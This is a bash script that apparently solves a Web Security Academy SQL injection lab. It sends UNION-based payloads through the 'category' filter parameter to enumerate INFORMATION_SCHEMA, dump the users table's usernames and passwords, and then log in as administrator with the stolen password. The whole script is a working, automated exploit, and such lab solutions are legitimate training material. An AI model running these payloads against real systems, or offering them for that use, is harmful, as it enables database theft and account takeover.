#!/bin/bash
if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain";
	exit 1;
fi
url="https://$1.web-security-academy.net";


# Injection method - category is improperly sanetized
inject() {
	curl \
			-s \
			-G "$url/filter" \
			--data-urlencode "category=Pets$1"
}

session() {
	response="$1";
	echo "$response" | grep '< Set-Cookie: session=' | cut -d'=' -f2 | cut -d';' -f1
}

login() {
	username="$1";
	password="$2";
	csrfResponse=$(curl -v -sG "$url/login" 2>&1);
	csrf=$(
		echo "$csrfResponse" |
		grep csrf |
		grep -Eo 'value=".+?"' |
		cut -d'"' -f2
	);
	
	session=$(session "$csrfResponse");
	redirectResponse=$(
		curl -v "$url/login" \
		--cookie "session=$session;" \
		--data-raw "csrf=$csrf&username=$targetUser&password=$password" 2>&1
	);

	# Redirect to /my-account
	session=$(session "$redirectResponse");
	echo "$redirectResponse";
	curl -v "$url/my-account" \
		--cookie "session=$session;"
}

usersTable=$(inject "' AND 1=0 UNION (SELECT TABLE_NAME, null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'users_%') -- " | grep '<th>users_' | cut -d'>' -f2 | cut -d'<' -f1);
columns=$(inject "' AND 1=0 UNION (SELECT COLUMN_NAME, null FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='$usersTable') -- ");
username_column=$(echo "$columns" | grep 'username_' | cut -d'>' -f2 | cut -d'<' -f1);
password_column=$(echo "$columns" | grep 'password_' | cut -d'>' -f2 | cut -d'<' -f1);
credentials=$(inject "' AND 1=0 UNION (SELECT $username_column, $password_column FROM $usersTable) -- ");

targetUser="administrator";
password=$(echo "$credentials" | grep -n1 "$targetUser" | tail -n1 | cut -d'>' -f2 | cut -d'<' -f1);
login "$targetUser" "$password";